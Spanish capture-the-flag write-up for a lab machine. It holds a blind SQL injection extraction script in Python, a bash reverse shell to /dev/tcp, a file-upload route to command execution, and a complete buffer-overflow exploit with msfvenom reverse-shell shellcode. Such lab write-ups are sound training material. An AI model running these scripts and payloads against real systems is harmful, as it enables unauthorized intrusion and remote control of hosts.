### Tags: `SQLI` `REC` `msfvenom` `BufferOverflow`

# Reconocimiento (`Linux`)

- Lo primero que hacemos es un **escaneo de equipos** que estén conectados a mi red de esta forma:

```ruby
arp-scan -I eth0 --localnet
```

![image](https://github.com/user-attachments/assets/ccac24ad-4eac-420f-aca8-5e2e0767c00d)

# Escaneo (**80**)

```css
sudo nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn <IP>
```

![image](https://github.com/user-attachments/assets/4f4b8e09-b5df-480f-b858-2f9ee6337f6a)

```css
sudo nmap -p80 -sCV <IP> -oN escaneo  
```

![image](https://github.com/user-attachments/assets/fcaa1281-32b9-48fc-b9f4-ac450e9d5959)

# Port 80

- Navegando por la web hicimos un `control + u` y observamos un doble ``==``  que nos llamo la atención  y vemos que estaba en **base64**, lo cual vamos decodificar

![image](https://github.com/user-attachments/assets/60c94905-ca6b-46b8-b1b5-390ac5be5115)

- Lo decodificamos y vemos que **nos dá otra cadena en base64**, lo volvemos a decodificar y nos da una **ruta** que vamos a poner en la web

![image](https://github.com/user-attachments/assets/adb0010e-9595-4a60-a7d9-9dc6815b7c39)
![image](https://github.com/user-attachments/assets/0b46ff27-5876-4a25-8b68-b24eb6b19c15)

Tenemos un panel de login

![image](https://github.com/user-attachments/assets/f48e48b6-8658-4bc4-a84a-b492d40fc784)

Si vamos a la web principal en la parte de **Contact Us** tenemos posibles usuarios la cual vamos a probar en el panel

![image](https://github.com/user-attachments/assets/46bb2956-1b45-427d-8fc7-3a64be4afd97)

# BurpSuite

- El único que funciona es `rmichaels` ya que nos dice **invalid password** y en los otros users nos dice **invalid username**
	- Por ende lo que vamos a hacer es interceptar con Burp la petición

![image](https://github.com/user-attachments/assets/96280361-4028-4e0b-b60c-2239130dff7c)

- Para burlar la contraseña podemos representar un **array** para que devuelva un NULL y se se emplea un **strcompare** nos va da devolver un exitoso por ende considera que lo que pusimos es **correcto**
	- Y vemos que si, que funcionó.

![image](https://github.com/user-attachments/assets/d92f2a05-d958-48ca-94b6-adbe23a26d39)

- Vemos que la **flag3** dice que continuemos con el CMS del link 

![image](https://github.com/user-attachments/assets/e32d9512-ef2b-4af2-b367-09a18a15f23f)
![image](https://github.com/user-attachments/assets/4088757e-0a9c-4232-8ac7-7402b7b0c23d)

- Dentro del link tenemos esto:

![image](https://github.com/user-attachments/assets/32ad07b0-bb52-41d5-b5e7-8670ec7c20d9)

- Probamos hacer un **LFI** pero no funcionó, pero ponemos un comilla nos **salta un error** lo cual es curioso
	- Por ende otra ves vamos a usar Burp

![image](https://github.com/user-attachments/assets/4d1f44f9-7b64-4388-bb93-cad7d65c055f)

# SQLI *Boolean* Based *Blind*

- Si hacemos un `'or '1'='1-- -` vemos que cambia la respuesta 
	- Entonces lo que vamos a hacer es jugar con condiciones booleanas, si algo devuelve **TRUE exitoso**, devuelve un output, si no es correcto cambia el output

![image](https://github.com/user-attachments/assets/a5ebb031-fa20-43b9-9258-f172e00e385a)

- Ahora lo que hacemos es probar si la base de datos `mysql` que siempre esta existe, jugando `limit` para que nos de una única base de datos.
	- Si la igualdad es correcta (si mysql está en la segunda base de datos,) veremos el la respuesta **Welcome to the IMF Administration.**

![image](https://github.com/user-attachments/assets/fe45d776-4972-422b-9016-d32bc8bc0542)

- Para comprobar si la primera base de datos era **information_schema** y vemos que sí

![image](https://github.com/user-attachments/assets/416d7d56-ad85-49d6-857c-f446d35568e1)

# Python Scripting

- Vamos a hacernos un script en Python para fuzear carácter por carácter y obtener el nombre de la base de datos.

### Cuantas Bases de Datos hay

- Con este comando podemos observar cuantas bases de datos hay y vemos que son 5 porque cuando lo igualamos a 5 nos sale el mensajito **Welcome to the IMF Administration.**
	- `' or (select count(schema_name) from information_schema.schemata)='5 `  (poner Ctrl+u para urlenconded)

```python
#!/usr/bin/python3

from pwn import *   #Para poder jugar con barras de progresos
import requests     #Para hacer peticiones HTTP
import string       #Para generar los caracteres de la contraseña
import time         #Para poder hacer sleep
import sys          #Para poder usar sys.exit()
import pdb          #Para poder hacer debugging
import signal       #Para hacer CTRL+C 



def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)



#Variables globales
main_url = "http://192.168.0.192/imfadministrator/cms.php?pagename=home"   #La peticion se tramita por GET
characters = string.ascii_lowercase + '-_'    #string.punctuation  #Abarca todo los simbolos el punctuation


def makeRequest():

    cookies = {"PHPSESSID": "hq7ejo76tsdk4prr3kdn9lsvm1"}   #Cookie de la sesion

    database = ""


    #Barras de Progreso
    p1 = log.progress("Fuerza Bruta")  
    p1.status("Iniciando proceso de fuerza bruta...")    #Para poder ver el mensaje de la barra de progreso
    time.sleep(2)   #Para poder hacer sleep

    p2 = log.progress("Databases")



    for dbs in range(0, 5): #porque hay 5 bases de datos 
        for position_character in range(1, 30):   #suponemos que la base de datos tiene 30 caracteres o menos
            for character in characters:
                sqli = main_url + f"'+and+(select+substring(schema_name,{position_character},1)+from+information_schema.schemata+limit+{dbs},1)='{character}"

                #p1.satatus(sqli)   #si quiero ver como se tramita para cada posicion y cada caracter

                r = requests.get(sqli, cookies=cookies)  #para poder ver la respuesta de la peticion

                if "Welcome to the IMF Administration" in r.text:
                    database += character
                    p2.status(database)  #jugamos con esta barra de progreso para que me muestre los datos de la base de datos
                    break

        database += ","


if __name__ == '__main__':
    makeRequest()

```

- Vemos que nos sacó una base de datos llamada `admin` que parece interesante

![image](https://github.com/user-attachments/assets/9df7e65a-8c90-4bb0-863d-15976b813594)

- Ahora listamos las **tablas** de la base de datos `admin` y vemos **pages**
	- solo cambiamos esto del script: `'+and+(select+substring(table_name,{position_character},1)+from+information_schema.tables+where+table_schema='admin'+limit+{dbs},1)='{character}"`

![image](https://github.com/user-attachments/assets/e4ef9219-36cf-46ea-83c0-a124d7e2a741)

- Ahora nos saco las **columnas**
	- El cambio:`"'+and(select+substring(column_name{position_character},1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+{dbs},1)='{character}"`

![image](https://github.com/user-attachments/assets/34cf8f4d-7c5f-451e-87de-60bd57b4863d)

![image](https://github.com/user-attachments/assets/dc026963-7ad9-4325-a874-7d9fd543da1b)

- Si observamos bien en la imagen hay un **QR**, por ende lo escaneamos desde esta página [QR-online](https://4qrcode.com/scan-qr-code.php)

![image](https://github.com/user-attachments/assets/21350e04-5b75-4c9f-984c-183efcb0fcc1)

- Vemos que tenemos una ruta 

![image](https://github.com/user-attachments/assets/09494da1-6e2e-49e0-99c8-c658c45e17b0)

# BurpSuite - Upload

- Vamos a interceptar con Burp la petición para ver que tipo de extensión nos deja subir

![image](https://github.com/user-attachments/assets/3acd9ba4-9571-4225-a6b6-a8d23d0bd97e)

- Probando distintas cosas pudimos sacar el tipo de archivo que aceptaba que era `GIF`
	- Nos copiamos los numeritos que están en el comentario y lo ponemos en la web

![image](https://github.com/user-attachments/assets/95a8e435-f747-4a28-acb6-0fbf3d3a6b85)

- Para saber donde se almacenaba el archivo encontramos que es en `uploads` ya que nos da un Forbidden 

![image](https://github.com/user-attachments/assets/92774948-80bd-47a6-ad2b-718b182a1db9)

- Vemos que tenemos ejecución remota de comandos
	- Por ende nos vamos a entablar una Shell de bash ---> `bash -c "bash -i >%26 /dev/tcp/IP/443 0>%261"`

![image](https://github.com/user-attachments/assets/6b7fef5c-4cca-4a96-8057-6c864e31e32a)

- Vemos que tamos dentro de la máquina

![image](https://github.com/user-attachments/assets/38598d5a-9cc1-48b2-b68a-2af8d2476387)

- Ahora hacemos el **tratamiento de la TTY**
```ruby
script /dev/null -c bash
ctrl + z
stty raw -echo ;fg
reset xterm
export TERM=xterm
export SHELL=bash
```

# Escalada *ROOT*

- Tenemos la quinta flag que la decodificamos 

![image](https://github.com/user-attachments/assets/eab24071-ee97-45e1-907c-c4bccc25a09f)
![image](https://github.com/user-attachments/assets/a7e1366d-f63c-4d03-9152-6cca1623eabd)

- Viendo los **puertos abiertos** con `netstat -nat` que hay en la máquinas observamos uno poco común que es el `7788`
	- Nos tratamos de conectar y nos pide in **Agent ID** que no tenemos, buscamos el binario en donde se almacenaba y lo encontramos

![image](https://github.com/user-attachments/assets/1f8be6de-d2e7-41d7-91f8-c7308ed3dab5)

- Ahora jugamos con `ltrace` para que ver que es lo que pasa cuando ejecutamos el binario `agent` y vemos que lo compara con **strncompare** de esto `48093572` 

![image](https://github.com/user-attachments/assets/7904baad-2ced-4e86-b19f-dc39e63a2698)

- Observamos que si funcionó el **ID**, ahora investigando vemos que la **opción 3** nos devuelve la cadena que pongamos.
	- Por lo tanto vamos probar a meterle muchas **"A"** y  vemos que dice **segmentation fault**, por lo tanto se ha aplicado un desbordamiento del Buffer asique podemos pensar en **Buffer Overflow**

![image](https://github.com/user-attachments/assets/07818dbf-b979-4b88-ab91-adb3fc538118)

# Buffer Overflow

- Como vimos tenemos el binario **Agent**  que si ponemos muchas "**A**" nos va a dar error ya que esta programado para una cierta cantidad de bytes

![image](https://github.com/user-attachments/assets/eb5545bd-ba74-4491-b76e-5d66156c6b80)

- Una ves visto eso, lo que hacemos ahora es pasarnos el **binario Agent** a nuestra máquina de atacante y poder jugar con **GDB-GEF** 

```css
#Máquina atacante
nc -nlvp 4444 > agent

#Máquina víctima
cd /usr/local/bin
nc ip 4444 < agent
```

- Ahora con ``md5sum`` comprobamos el hash para **ver si son iguales** por si hubo alguna corrupción pero vemos que no

![image](https://github.com/user-attachments/assets/05d401a8-b45f-4e30-85f0-05b82e94d022)
![image](https://github.com/user-attachments/assets/212da93e-7a31-491b-90a9-87479336a4d1)

- Ahora vamos a ver las protecciones del binario con `checksec` y vemos que no tiene ninguna protección
	- Como el NX no esta habilitado , el Shellcode nos lo va a interpretar

```ruby
sudo apt update -y && sudo apt upgrade -y
sudo apt install checksec
sudo apt install python3-pwntools
```

![image](https://github.com/user-attachments/assets/63ab7432-bff1-4d18-b6cf-43dbd3b78cff)

### Instalar GDB-GEF

```css
sudo apt install gdb
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

# ASLR *->* Habilitado

- Como están cambiando los números esto quiere decir que el **ASLR** está **HABILITADO**
	- Como los números son cortos vemos que estamos en **máquina de 32 bits** (haciendo un `file agent` tamb podes ver que el binario es de 32-bit)

![image](https://github.com/user-attachments/assets/bde4e6d1-fa6f-4b4b-aff5-eb26af77589a)

- Bien ahora lo que vamos a averiguar es cuentas ``A`` hay que meter hasta llegar a sobrescribir este registro "**EIP**" (offset llamado a veces)
	- Hay un utilidad en peda que es esta `pattern create` **---->** Lo que hacemos es crear un cadena aleatorias para después jugar con **pattern offset**

![image](https://github.com/user-attachments/assets/db4aaccc-e0e2-42f0-a215-9bb671334bc7)

- Nos lo copiamos toda esa cadena de caracteres y ejecutamos el binario y lo pegamos y al darle ale **Enter** vemos que el `$eip` vale **raab**

![image](https://github.com/user-attachments/assets/7f193195-9009-428a-bcaa-095446d842ee)

- Entonces si ahora hacemos un `pettern offset $eip` nos dice que son **168 caracteres** para luego sobrescribir el EIP

![image](https://github.com/user-attachments/assets/a3af57c7-751e-4225-8834-4dda2e39cbf6)

- Ahora vemos si haciendo que *nos imprima 168 A* y como *Últimos 4 bytes la B*  -----> vemos si **nos retorna BBBB y 0x42424242** que es la B en hexadecimal

![image](https://github.com/user-attachments/assets/073d4f8b-4d99-4d3d-88ec-644ffb4bb8f0)
![image](https://github.com/user-attachments/assets/76e6cc6b-3f07-42b2-b1d9-03036547e1db)

# Ret2reg

- Una ves *sobrescribimos* el registro **EIP** toda las demás cadena que pongamos van a estar en el *comienzo* del **ESP** 
	- Si vemos **EAX** vale AAAA... , entonces si filtramos por `x/16wx $eax` están las Aes pero si retrocedemos *cuatro para atrás* ya no es el mismo valor, entonces podemos pensar que el *comienzo* del *payload* corresponde al registro **$eax**

![image](https://github.com/user-attachments/assets/c92f5365-3a6c-4849-8647-e60830ac3680)

## Msfvenom

- Vamos a crear el ``shellcode`` para que me entable una Reverse Shell 
	- ``-b``  --> es de Bad Chars, para que nos cree un shellcode sin esos caracteres
   	- ``shell_reverse_tcp`` porque queremos conectarnos por netcat

![image](https://github.com/user-attachments/assets/370a206b-97b3-4d87-b98a-9a3f74ad2162)

- Bien ahora nos vamos a crear un **script.py** en la máquina víctima en  ``/tmp`` en donde pegamos nuestro shellcode 
	- Ahora vamos a nuestra máquina y ponemos el siguiente comando para buscar el `call eax` que lo que nos va a buscar es el **Opeartion Code**

![image](https://github.com/user-attachments/assets/94e58b1c-94d9-44d5-831b-9961456536fc)

- Una ves obtenido, jugamos con `objdump` y filtramos por esa cadena `FF D0`
	- Tenemos una **dirección** en el binario en el que podemos apuntar para  ir por ahí 

![image](https://github.com/user-attachments/assets/d089ec79-11f2-4fe6-881e-3f3905c1bc35)

- Lo que vamos a hacer ahora es que  la **EIP** apunta a esa dirección porque nosotros podemos controlarlo, ya que en esa dirección se aplica un `call eax` por ende el flujo del programa **va a el registro $eax** que comenzaría con el flujo del ``shellcode`` que creamos con ``msfvenom``
	- Por ende ahora nuestro **script.py** quedaría de esta forma:

```python
#!/usr/bin/python3

import socket

offset = 168

#Shellcode
buf =  b""
buf += b"\xba\x78\x35\x3e\xca\xdb\xd4\xd9\x74\x24\xf4\x5d"
buf += b"\x33\xc9\xb1\x12\x31\x55\x12\x83\xed\xfc\x03\x2d"
buf += b"\x3b\xdc\x3f\xfc\x98\xd7\x23\xad\x5d\x4b\xce\x53"
buf += b"\xeb\x8a\xbe\x35\x26\xcc\x2c\xe0\x08\xf2\x9f\x92"
buf += b"\x20\x74\xd9\xfa\x72\x2e\x19\x66\x1a\x2d\x1a\x97"
buf += b"\x60\xb8\xfb\x27\xf0\xeb\xaa\x14\x4e\x08\xc4\x7b"
buf += b"\x7d\x8f\x84\x13\x10\xbf\x5b\x8b\x84\x90\xb4\x29"
buf += b"\x3c\x66\x29\xff\xed\xf1\x4f\x4f\x1a\xcf\x10"

#Lo que nos falta para sobreescribir el EIP ya que el shellcode es de 95 bytes entonces seria (168-95)
buf += b"A"*(offset-len(buf))

#little endian
buf += b"\x63\x85\x04\x08\n"  # 8048563 -> jmp EAX

#Establecer Conexion TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 7788))

#Enviar la cadena
s.send(b"48093572\n")  # barra n-> seria un ENTER
data = s.recv(1024)

s.send(b"3\n")
data = s.recv(1024)

s.send(buf)  #Por ultimo enviamos nuestro shellcode
```
   
- Estamos **dentro** de la máquina víctima!

![image](https://github.com/user-attachments/assets/a05f6182-ec0b-4cf8-ad0c-5adfa1a104d5)

- Para terminar obtuvimos la la **última flag** de ``ROOT``

![image](https://github.com/user-attachments/assets/69711e06-a5c2-4c39-b0ae-97b0ac16c386)



















































































